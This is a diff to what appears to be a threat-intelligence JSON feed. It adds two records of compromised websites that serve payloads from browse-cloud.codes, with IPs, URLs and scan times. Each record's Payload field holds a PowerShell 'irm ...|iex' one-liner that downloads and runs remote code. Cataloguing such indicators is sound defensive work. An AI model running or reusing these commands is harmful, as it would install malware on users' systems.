@@ -1291,5 +1291,49 @@
     ],
     "ReportId": "cmwl5x2pj1hne0omlek9idizj",
     "ScannedAt": "2026-11-17T20:46:15.496000+00:00"
+  },
+  {
+    "UrlDomain": "shapepsychology.co.uk",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "162.255.118.66"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/e1869d542b246dfd",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/e1869d542b246dfd'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/e1869d542b246dfd"
+    ],
+    "ReportId": "cmwl6sv421hpq0omls4ocdb1w",
+    "ScannedAt": "2026-11-17T21:10:58.737000+00:00"
+  },
+  {
+    "UrlDomain": "spacegnomestudio.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "50.87.253.14"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/1c1a06922ba83122",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/1c1a06922ba83122'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/1c1a06922ba83122"
+    ],
+    "ReportId": "cmwl6e29x1ho90oml4soletk3",
+    "ScannedAt": "2026-11-17T20:59:28.173000+00:00"
   }
 ]
